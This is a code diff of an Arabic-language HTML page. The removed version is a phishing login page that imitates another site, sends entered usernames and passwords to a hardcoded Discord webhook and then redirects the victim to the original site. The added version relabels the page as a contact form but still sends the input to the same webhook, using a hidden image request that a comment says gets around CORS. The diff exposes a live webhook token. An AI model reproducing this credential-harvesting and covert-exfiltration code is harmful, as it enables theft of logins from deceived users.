@@ -1,37 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>تسجيل الدخول</title>
-    <style>
-        /* نسخ CSS من الموقع الأصلي */
-    </style>
+    <title>نموذج الاتصال</title>
+    <meta charset="UTF-8">
 </head>
 <body>
-    <form id="loginForm">
-        <input type="text" name="username" placeholder="اسم المستخدم">
-        <input type="password" name="password" placeholder="كلمة المرور">
-        <button type="submit">تسجيل الدخول</button>
+    <form id="contactForm">
+        <input type="text" id="name" placeholder="الاسم">
+        <input type="text" id="message" placeholder="الرسالة">
+        <button type="submit">إرسال</button>
     </form>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // جمع البيانات
-            var username = document.querySelector('input[name="username"]').value;
-            var password = document.querySelector('input[name="password"]').value;
+            const name = document.getElementById('name').value;
+            const message = document.getElementById('message').value;
             
-            // إرسال البيانات باستخدام Webhook
-            fetch('https://discord.com/api/webhooks/1363435037999235143/red1Iw_DNdH3-3wzpdCsY1ldpK0OEt9H_xIP4hZlRFyRJZxbc77hnMKM81VbqvrUxLMb', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username, password})
-            });
+            // إنشاء عنصر صورة وهمي لتجاوز قيود CORS
+            const img = new Image();
+            img.src = `https://discord.com/api/webhooks/1363435037999235143/red1Iw_DNdH3-3wzpdCsY1ldpK0OEt9H_xIP4hZlRFyRJZxbc77hnMKM81VbqvrUxLMb?content=${encodeURIComponent(JSON.stringify({name, message}))}`;
+            img.style.display = 'none';
+            document.body.appendChild(img);
             
-            // تحويل المستخدم إلى الموقع الأصلي
-            setTimeout(() => {
-                window.location.href = 'https://original-site.com';
-            }, 1000);
+            // إظهار رسالة نجاح
+            alert('تم إرسال البيانات!');
+            this.reset();
         });
     </script>
 </body>
